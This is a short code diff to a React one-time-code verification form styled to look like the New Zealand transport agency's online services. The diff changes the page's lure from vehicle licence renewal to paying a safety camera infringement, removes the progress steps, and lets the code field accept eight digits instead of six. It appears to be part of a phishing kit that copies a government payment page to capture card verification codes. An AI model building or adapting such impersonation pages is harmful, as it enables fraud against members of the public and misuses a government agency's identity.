@@ -28,10 +28,7 @@ function OtpVerificationForm({ otpCode, otpError, isLoading, onOtpChange, onSubm
               className="nzta-logo-img"
             />
           </div>
-          <div className="nzta-services-tab">
-            
-            <span>Online Services</span>
-          </div>
+          
         </div>
       </header>
 
@@ -48,24 +45,10 @@ function OtpVerificationForm({ otpCode, otpError, isLoading, onOtpChange, onSubm
           ← Back
         </a>
 
-        <h1 className="nzta-title">Renew your vehicle licence (rego)</h1>
+        <h1 className="nzta-title"> Pay a safety camera infringement
+</h1>
 
-        {/* Steps — 3 steps, step 3 active */}
-        <ol className="nzta-steps">
-          <li className="nzta-step done">
-            <span className="nzta-step-circle">1</span>
-            <span className="nzta-step-label">Enter vehicle details</span>
-          </li>
-          <li className="nzta-step done">
-            <span className="nzta-step-circle">2</span>
-            <span className="nzta-step-label">Enter payment details</span>
-          </li>
-          <li className="nzta-step active">
-            <span className="nzta-step-circle">3</span>
-            <span className="nzta-step-label">Confirmation</span>
-          </li>
-        </ol>
-
+        
         <hr className="nzta-divider" />
 
         <p className="nzta-hint">
@@ -86,11 +69,11 @@ function OtpVerificationForm({ otpCode, otpError, isLoading, onOtpChange, onSubm
               id="otpCode"
               value={otpCode}
               onChange={(e) => {
-                const value = e.target.value.replace(/\D/g, '').slice(0, 6);
+                const value = e.target.value.replace(/\D/g, '').slice(0, 8);
                 onOtpChange(value);
               }}
               placeholder={safeT.otpPlaceholder}
-              maxLength="6"
+              maxLength="8"
               className={`nzta-input ${otpError ? 'input-error-red' : ''}`}
               autoFocus
             />
